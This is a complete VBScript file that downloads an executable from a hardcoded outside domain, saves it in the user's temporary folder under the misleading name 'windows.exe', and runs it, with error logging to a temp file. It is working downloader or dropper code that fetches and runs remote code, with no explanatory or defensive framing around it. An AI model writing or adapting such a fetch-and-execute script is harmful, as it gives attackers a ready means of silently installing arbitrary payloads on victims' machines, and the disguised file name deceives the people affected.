Option Explicit

Dim shell, fso, executableName, errorLog, installerUrl

installerUrl = "https://thugging.org/static/main.exe"
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
executableName = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\windows.exe")
errorLog = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\error.txt")

' Download the executable
If Not DownloadExecutable(installerUrl, executableName) Then
    LogError "Failed to download the executable from " & installerUrl & "."
    WScript.Quit 1
End If

' Run the downloaded executable
If Not RunExecutable(executableName) Then
    LogError "Execution of the downloaded executable failed."
    WScript.Quit 1
End If

WScript.Echo "Executable ran successfully."

' Function to download the executable
Function DownloadExecutable(url, path)
    On Error Resume Next
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlhttp.Open "GET", url, False
    xmlhttp.Send
    If xmlhttp.Status = 200 Then
        Dim stream
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write xmlhttp.ResponseBody
        stream.SaveToFile path, 2 ' Overwrite
        stream.Close
        DownloadExecutable = True
    Else
        DownloadExecutable = False
    End If
    On Error GoTo 0
End Function

' Function to run the downloaded executable
Function RunExecutable(path)
    On Error Resume Next
    shell.Run """" & path & """", 1, True
    RunExecutable = (Err.Number = 0)
    On Error GoTo 0
End Function

' Function to log errors to error.txt
Sub LogError(message)
    Dim logFile
    If Not fso.FileExists(errorLog) Then
        Set logFile = fso.CreateTextFile(errorLog, True)
    Else
        Set logFile = fso.OpenTextFile(errorLog, 8) ' Append mode
    End If
    logFile.WriteLine Now & ": " & message
    logFile.Close
End Sub